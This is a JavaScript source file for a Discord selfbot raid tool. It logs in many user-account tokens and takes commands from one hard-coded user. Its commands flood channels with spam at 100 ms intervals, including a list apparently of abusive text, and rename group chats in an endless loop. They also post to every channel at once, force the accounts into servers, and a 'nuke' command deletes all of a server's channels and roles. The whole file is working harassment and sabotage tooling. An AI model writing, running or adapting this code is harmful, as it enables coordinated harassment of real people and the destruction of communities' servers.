require('dotenv').config();
const { Client } = require('discord.js-selfbot-v13');
const jtList = require('./jtlist'); 

const ADMIN_USER_ID = "1429412320194592811"; // 코린 ID 고정

const adminToken = process.env.ADMIN_TOKEN;
const workerTokens = Object.keys(process.env)
    .filter(k => k.startsWith('TOKEN_'))
    .map(k => process.env[k].trim())
    .filter(Boolean);

const allTokens = [adminToken, ...workerTokens].filter(Boolean);
const clients = [];
const activeSpam = new Map();
let statusInterval = null;

// [데이터 박제] ︻デ═一 시그니처 수정 완료
const getRand = () => '\n> ︻デ═一 코린이 영역전개로 패죽인 수 > ' + (Math.floor(Math.random() * 900000) + 100000);
const bible = Array.from({ length: 300 }, (_, i) => `[성경 제 ${i + 1}장] 코린을 찬양하라, 그가 곧 진리이니라.`);

const executeSpam = async (client, channel, type, args) => {
    if (!activeSpam.has(client.user.id)) return;
    try {
        let content = "";
        if (type === 'sp') content = (args.join(' ') || '코린 찬양');
        else if (type === 'jt') content = jtList[Math.floor(Math.random() * jtList.length)];
        else if (type === 'start') content = bible[Math.floor(Math.random() * bible.length)];

        await channel.send(content + getRand());
        setTimeout(() => executeSpam(client, channel, type, args), 100);
    } catch (e) {
        setTimeout(() => executeSpam(client, channel, type, args), e.code === 429 ? 2000 : 1000);
    }
};

allTokens.forEach((token, index) => {
    const client = new Client({ checkUpdate: false });
    const isAdminBot = (token === adminToken);

    client.on('ready', () => {
        console.log(`[!] ︻デ═一 가동: ${client.user.tag}`);
        clients.push(client);
    });

    client.on('messageCreate', async (msg) => {
        if (!msg.content.startsWith('>') || msg.author.id !== ADMIN_USER_ID) return;

        const args = msg.content.slice(1).trim().split(/ +/);
        const cmd = args.shift().toLowerCase();

        // ---------------- [ 워커 전용 난사 컨트롤 ] ----------------
        if (!isAdminBot) {
            if (['sp', 'jt', 'start'].includes(cmd)) {
                activeSpam.set(client.user.id, true);
                executeSpam(client, msg.channel, cmd, args);
            }
            if (['sps', 'jts', 'stop'].includes(cmd)) activeSpam.delete(client.user.id);
        }

        // ---------------- [ 관리자(코린) 명령어 세트 ] ----------------
        if (isAdminBot) {
            switch (cmd) {
                case 'h': // 도움말 줄바꿈 완벽 적용
                    const help = [
                        ">sp [내용] : 워커 무한 도배 시작",
                        ">sps : 도배 중지",
                        ">jt : 장애타 시작",
                        ">start : 성경 난사 시작",
                        ">st [내용] : 전원 상태 메시지 고정",
                        ">cls [수] : 내 메시지 삭제 (청소)",
                        ">fri @멘션 : 즉시 친구 추가",
                        ">jn [링크] : 서버 강제 입장",
                        ">lv : 현재 서버 탈퇴",
                        ">nick [이름] : 전원 닉네임 강제 변경",
                        ">gnc [이름] : 그룹 채팅방 이름 무한 변경",
                        ">gncs : 방제 변경 중지",
                        ">nuke : (권한필요) 채널/역할 싹 다 삭제",
                        ">md [내용] : 모든 채널에 메시지 뿌리기"
                    ].join('\n');
                    msg.channel.send('```\n' + help + '\n
```');
                    break;

                case 'st': // 상태 고정 (30초 주기)
                    const stTxt = args.join(' ');
                    if (statusInterval) clearInterval(statusInterval);
                    const setST = () => clients.forEach(c => c.user?.setActivity(stTxt, { type: 'PLAYING' }));
                    setST();
                    statusInterval = setInterval(setST, 30000);
                    msg.channel.send(`\`\`\`[!] 전원 상태 업데이트: ${stTxt}\`\`\``);
                    break;

                case 'lv': // 서버 나가기
                    msg.guild?.leave().catch(() => {});
                    break;

                case 'nick': // 전원 닉네임 변경
                    clients.forEach(c => {
                        msg.guild?.members.cache.get(c.user.id)?.setNickname(args.join(' ')).catch(() => {});
                    });
                    break;

                case 'nuke': // 서버 파괴
                    if (!msg.guild) return;
                    msg.guild.channels.cache.forEach(ch => ch.delete().catch(() => {}));
                    msg.guild.roles.cache.forEach(r => r.delete().catch(() => {}));
                    break;

                case 'gnc': // 그룹방 이름 테러
                    activeSpam.set(client.user.id + 'gnc', true);
                    const gncLoop = async () => {
                        if (!activeSpam.has(client.user.id + 'gnc')) return;
                        await msg.channel.setName(args.join(' ') + " " + Math.random().toString(36).substring(2, 5)).catch(() => {});
                        setTimeout(gncLoop, 1500);
                    };
                    gncLoop();
                    break;

                case 'gncs':
                    activeSpam.delete(client.user.id + 'gnc');
                    break;

                case 'md': // 모든 채널 도배
                    msg.guild?.channels.cache.filter(c => c.type === 'GUILD_TEXT').forEach(ch => {
                        ch.send(args.join(' ') + getRand()).catch(() => {});
                    });
                    break;
                
                case 'cls': // 청소
                    const count = parseInt(args[0]) || 10;
                    msg.channel.messages.fetch({ limit: 50 }).then(ms => {
                        ms.filter(m => m.author.id === client.user.id).first(count).forEach(m => m.delete().catch(() => {}));
                    });
                    break;
            }
        }
    });

    client.login(token).catch(() => {});
});

process.on('unhandledRejection', (err) => console.log('[!] 시스템 가드:', err.message));